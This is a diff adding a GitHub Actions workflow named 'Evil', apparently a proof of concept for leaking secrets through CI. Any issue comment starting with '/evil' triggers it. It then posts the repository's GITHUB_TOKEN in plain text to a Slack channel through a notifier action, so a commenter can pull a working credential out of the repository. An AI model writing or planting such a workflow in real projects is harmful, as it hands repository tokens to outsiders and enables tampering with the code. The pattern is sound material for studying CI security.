@@ -1,0 +1,17 @@
+name: Evil
+
+on:
+  issue_comment:
+
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions-ecosystem/action-slack-notifier@v1
+        if: ${{ startsWith(github.event.comment.body, '/evil') }}
+        with:
+          slack_token: ${{ secrets.SLACK_TOKEN }}
+          message: "secrets.GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}"
+          channel: dev
+          color: blue # optional
+          verbose: true # optional
